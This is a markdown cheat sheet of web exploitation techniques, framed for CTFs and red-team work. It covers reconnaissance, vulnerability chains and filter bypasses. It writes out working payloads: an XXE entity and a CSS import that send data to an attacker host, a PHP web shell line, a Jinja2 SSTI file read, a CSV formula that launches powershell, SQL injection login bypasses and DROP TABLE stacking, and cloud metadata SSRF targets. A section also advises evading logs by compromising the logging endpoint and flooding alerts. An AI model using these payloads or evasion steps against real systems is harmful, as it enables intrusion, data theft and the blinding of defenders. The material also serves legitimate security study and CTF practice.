# Web Security Techniques & Exploitation Patterns

**Level**: Advanced (20+ years pentesting experience)
**Focus**: Real-world exploitation chains, bypass techniques, and lesser-known vectors

## HTTP Status Codes & Response Analysis (Advanced)

- **200 OK** — verify nothing is cached/stale; check ETags, Cache-Control, Last-Modified
- **204 No Content** — dangerous; often bypasses CSP/WAF logging on certain operations
- **206 Partial Content** — Range requests can leak file size, encoding, and bypass filters
- **301/302/307/308** — track redirect chains for auth bypass; 307/308 preserve method/body (exploit POST redirects)
- **304 Not Modified** — cache poisoning vector; conditional requests with manipulated headers
- **401 Unauthorized** — enumerate valid paths via response time differential, response size
- **403 Forbidden** — bypass via case-sensitivity, null bytes (`%00`), encoding, verb tampering (OPTIONS, HEAD, TRACE)
- **404 Not Found** — distinguish from 403 via timing; some frameworks leak info about "would-be" paths
- **429 Too Many Requests** — bypass via header rotation, slow distributed requests, or JWT token refresh
- **500 Internal Server Error** — stack traces are gold; error message variation reveals framework/version
- **502/503** — upstream service failure; test backend directly, check for internal service enumeration

## Response Header Analysis (Reconnaissance)

- **Server, X-Powered-By** — framework/version identification (exploit known CVEs)
- **X-Frame-Options** — clickjacking risk if absent or misconfigured (ALLOWALL is rare but exists)
- **X-Content-Type-Options** — missing nosniff means MIME type can be confused (upload .txt as .html)
- **Content-Security-Policy** — often has unsafe-inline, data:, or script-src 'self' that can be escaped
- **Set-Cookie** — check SameSite (absent = CSRF), Secure (missing on HTTPS), HttpOnly (missing = XSS→session steal)
- **Strict-Transport-Security** — presence indicates past HTTPS-only stance; test for downgrade
- **Timing headers** — X-Response-Time, X-Processing-Time leak execution cost (timing-based side channels)
- **Custom debug headers** — X-Debug, X-Error-ID, X-Request-ID often contain debug info

## Flag Hiding Patterns (Real CTF Archaeology)

### Client-side storage (immediate access)
- **DOM properties**: window.flag, window.__FLAG__, window.config.flag (check in console)
- **LocalStorage/SessionStorage**: stored as-is (localStorage['flag'], accessible without auth)
- **IndexedDB**: browser DB, queryable; test `indexedDB.databases()`, enumerate stores
- **Service Worker cache**: `.json` files cached can leak flags/credentials
- **WebSocket frames**: open DevTools Network tab during page load; capture initial WS message
- **JavaScript source comments**: minified JS often has `// FLAG: ...` or TODO markers
- **Webpack/Parcel sourcemaps**: `.map` files in public folder expose source code entirely
- **React DevTools exposure**: window.__REACT_DEVTOOLS_GLOBAL_HOOK__ with full state trees

### HTTP-layer discovery
- **Response headers**: X-Flag, X-Secret, X-Token (custom headers often tested by CTF setters)
- **Set-Cookie with embedded flag**: flag={base64_encoded_value}; decode if needed
- **Transfer-Encoding: chunked** with odd chunk sizes (some apps leak data in chunk headers)
- **Location header on redirect**: may contain token/code instead of a URL
- **Link header**: often contains API endpoint URLs or resource hints
- **Trailer headers** (HTTP/1.1): less-known headers sent after the body

### API & JSON responses
- **Nested fields** under error messages: `{"error": {"debug": "flag_is_here"}}`
- **Metadata endpoints**: `/api/metadata`, `/.well-known/config.json`, `/api/version`
- **GraphQL introspection**: `__schema { types { name fields { name } } }` dumps entire schema including hidden fields
- **JSONP callbacks**: `?callback=flag` might output flag in wrapper
- **Bulk export endpoints**: `/api/export`, `/api/backup` often bypass auth or contain PII
- **Pagination cursors**: base64 cursors often decode to SQL OFFSET/LIMIT revealing structure

### Storage & database leaks
- **SQL error messages**: UNION-based SQLi reveals column names and data types
- **NoSQL operator exposure**: `{$where: "..."}`, `{$regex: "..."}` in query parsing
- **ORM debug mode**: Stack traces from SQLAlchemy/Hibernate reveal table/column structure
- **Database backup files**: `db.sqlite`, `database.sql.bak`, `dump.sql` in git/web root
- **Environment variable leakage**: `.env` file accidentally served, or leaked via PHP `phpinfo()`

### Advanced extraction
- **Timing-based data exfiltration**: SQLi via SLEEP(), requests taking 5s vs 1s
- **Blind XXE with OOB**: exfiltrate via DNS: `<!ENTITY xxe SYSTEM "http://attacker/?x=file:///etc/flag">`
- **XPath blind injection**: bit-by-bit extraction via XML node count: `//user[position()>2]`
- **Error-based injection**: MySQL `EXTRACTVALUE()`, PostgreSQL `generate_subscripts()`, MSSQL XML methods

## Common Vulnerability Chains (Exploitation Playbook)

### Chain 1: IDOR → Privilege Escalation → Data Exfiltration
1. Enumerate user IDs via `/api/user/{id}` (timing differences or sequential numbers)
2. Extract admin ID or find privilege escalation user (service account, developer account)
3. Use IDOR to access their profile, API keys, or config
4. Use leaked API key to access restricted endpoints (bulk export, debug API, etc.)
5. Exfiltrate all user data or find flag in admin-only section

### Chain 2: File Upload → Path Traversal → RCE
1. Upload file with traversal path: `../../shell.php` or via ZIP symlink
2. If direct RCE fails, overwrite config: `../../config/config.php` → `<?php system($_GET['c']); ?>`
3. Or upload to web root and access via URL
4. Execute code, read flags from filesystem or database

### Chain 3: Authentication Bypass → Session Fixation → CSRF
1. Bypass login via SQLi, LDAP injection, or default credentials
2. Extract/forge session token (JWT, predictable, unsigned)
3. Use token to perform privileged action (CSRF if session is tied to cookies)
4. Escalate to admin account via CSRF→privilege escalation

### Chain 4: XXE → SSRF → Internal Service Takeover
1. Upload XML or use XML endpoint (SVG, DTD, etc.)
2. XXE to read local files: `file:///etc/passwd`, `file:///app/config.php`
3. Use XXE to probe internal services: `http://localhost:8080/admin`
4. SSRF into Redis/Memcache to read session data or RCE via gopher protocol
5. Access internal API, database, or admin panels

### Chain 5: Template Injection → Object Introspection → RCE
1. Identify template language (Jinja2, Mako, Twig, etc.) via context variable expansion
2. Escalate to object/attribute access: `{{ obj.__class__.__bases__ }}`
3. Traverse to dangerous classes: `__builtins__`, `os.system`, file operations
4. RCE: `{{ namespace.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}`

### Chain 6: CSV Injection → Malware Distribution (in CTF context, points-based)
1. Inject formula into CSV: `=cmd|'/c powershell ...`
2. When opened in Excel, executes arbitrary code
3. Often scores points even without direct flag access

## Bypass Techniques (WAF/IDS/Input Validation)

### SQL Injection Evasion
- **Comment styles**: `--`, `#`, `/* */`, `--+`, `-- -`, `;%00`
- **Keyword obfuscation**: `UNION/**/SELECT`, `UNiON`, `/*!50000UNION*/` (MySQL version gate)
- **Encoding**: `CHAR(65)` → 'A', hex encoding `0x41`, base64 with CONVERT()
- **Alternative operators**: `BETWEEN`, `NOT IN()`, `LIKE '%pattern%'` instead of `=`
- **Stacking queries**: `; DROP TABLE--` (if DB supports stacking)
- **Time delays**: SLEEP(5), BENCHMARK(100000000,MD5('a')), WAITFOR DELAY

### XSS Bypass Filters
- **Tag alternatives**: `<svg>`, `<iframe>`, `<embed>`, `<object>`, `<marquee>`
- **Event handlers**: `onload`, `onerror`, `onmouseover`, `onmousemove`, `oninput`, `onchange`, `ontouchstart`
- **Encoding**: HTML entities (`&#60;`), UTF-8 (`%3C`), URL encoding, JavaScript unicode (`<`)
- **Case variation**: `<ScRiPt>`, `<IMG>`, `<input onfocus=alert(1) autofocus>`
- **Null byte injection**: `<script%00>` (bypasses some parsers)
- **DOM clobbering**: `<form name="config"><input name="apiKey">` overwrites JS globals
- **CSS injection**: `<style>@import url('http://attacker/steal.css?data=...')</style>`

### CSRF Token Bypass
- **Token not tied to session**: Copy token from one session to another
- **Predictable tokens**: Sequential or weak random; brute-force or predict
- **Token validation skipped on GET**: Attacker sends GET instead of POST
- **Token not validated on origin**: Missing Referer/Origin check (or check is bypassable)
- **SameSite=None; Secure** with cross-site POST → fully exploitable

### Authentication Bypass
- **Null character truncation**: Username `admin%00extra` truncates to `admin`
- **Case/encoding variation**: `AdMiN`, `ADMIN`, `admin@` if normalization is inconsistent
- **SQL WHERE clause bypass**: `admin' OR '1'='1`, `admin'; --`
- **LDAP injection**: `*`, `*)(uid=*`, wildcards in LDAP queries
- **JWT signature bypass**: `"alg": "none"`, algorithm confusion (HS256 vs RS256)
- **Session fixation**: Set attacker-controlled session ID before login

## Advanced Web Reconnaissance

### JavaScript Analysis
- Extract API endpoints from bundled JS (webpack, Angular, React)
- Parse GraphQL query/mutation names to understand data model
- Find hardcoded credentials (API keys, admin accounts, test data)
- Decompile minified code: `js-beautify`, online decompilers
- Check for feature flags/debug modes enabled in production

### API Enumeration
- Test all HTTP methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD, TRACE
- Enumerate versions: `/v1/`, `/v2/`, `/api/v3.1/`, `/beta/`
- Try ACCEPT header variations: `application/json`, `application/xml`, `application/yaml`
- Fuzz content-type: `application/json`, `application/x-www-form-urlencoded`, `multipart/form-data`
- Test API key locations: header `X-API-Key`, URL param `?api_key=`, cookie `api_key=`

### Database Fingerprinting (via error/timing)
- MySQL: `SELECT @@version`, `SLEEP(5)`, error-based: `AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ...)))`
- PostgreSQL: `SELECT version()`, `pg_sleep(5)`, `CAST(... AS INTEGER)` for error
- MSSQL: `SELECT @@VERSION`, `WAITFOR DELAY '00:00:05'`, `RAISERROR`
- Oracle: `SELECT banner FROM v$version`, `DBMS_LOCK.SLEEP()`
- SQLite: `SELECT sqlite_version()`, `PRAGMA table_info(table_name)`
- MongoDB: `db.version()`, timing via `$where` JavaScript

### DNS/SSRF Reconnaissance
- Subdomain enumeration via SSRF: `http://attacker-controlled-domain.aws.internal/`
- Internal service discovery: `http://localhost:8080`, `http://127.0.0.1:9200` (Elasticsearch), `http://169.254.169.254/` (AWS metadata)
- Cloud metadata endpoints: AWS `http://169.254.169.254/latest/meta-data/`, GCP `http://metadata.google.internal/`
- Test protocols: `gopher://`, `dict://`, `file://`, `ldap://`, `sftp://`

## Real-World Integration Patterns

### Working with Signed/Encrypted Tokens
1. **JWT tokens**: Extract claims, check signature algorithm, test `"alg": "none"`, algorithm confusion
2. **Encrypted tokens**: Derive key from server responses, use timing attacks, or brute-force weak keys
3. **Opaque tokens**: Use token in SSRF to access backend APIs directly; may be API key
4. **Session cookies**: Analyze format (base64, hex, serialized), predict next value (PRNG)

### Exploiting Modern Frameworks
- **Django**: `DEBUG=True` in SETTINGS, ALLOWED_HOSTS bypass via Host header manipulation
- **Flask**: Secret key leakage via error pages, Jinja2 SSTI via `{{ config }}`
- **ASP.NET**: ViewState deserialization RCE, ASPX path traversal
- **Node.js/Express**: Middleware bypass (missing trailing slash), res.locals pollution
- **Spring**: SpEL injection in `@Value` annotations, XML config exposure

## Detection & Evasion (Red Team Context)

### WAF Detection Evasion
- Rotate User-Agent, referer, accept-language headers
- Split payloads across parameters
- Use slow request patterns to evade rate-based detection
- Test for **positive** vs **negative** security model (block known bad vs allow known good)
- Exploit **time-of-check-time-of-use (TOCTOU)** race conditions

### Logging Evasion
- Minimize obvious patterns: avoid `../../../etc/passwd`, use URL encoding/case variation
- Test if WAF/IDS logs are centralized; compromise logging endpoint
- Inject log data to cause false positives (IDS/SIEM alert fatigue)
- Use HTTPS to bypass request-level logging (only TLS handshake visible)

### Blind Testing Techniques
- **Boolean-based SQLi**: `AND 1=1` vs `AND 1=2` to infer truth
- **Time-based SQLi**: SLEEP() to confirm vulnerability without visible output
- **Out-of-band (OOB)**: DNS/HTTP callbacks via XXE, SQLi, or command injection
- **Inferential attacks**: Response size, timing, error message variation

## CTF-Specific Winning Patterns

1. **Read the source code first** — if available, save 20 hours; understand framework/assumptions
2. **Automate path enumeration** — use `dir_enum` tool + common wordlist before manual guessing
3. **Test the "stupid" vulnerabilities first** — default credentials, .git exposure, .env leaks often win
4. **Combine technique notes** — no single vulnerability wins; chain IDOR + SQLi + RCE
5. **Understand the application story** — why does it exist? What data does it handle? Flag is usually in that data
6. **Check source control** — `.git/HEAD`, commit history, branches often leak secrets or dev comments
7. **Enumerate all parameters** — every input field, header, cookie is a potential injection point
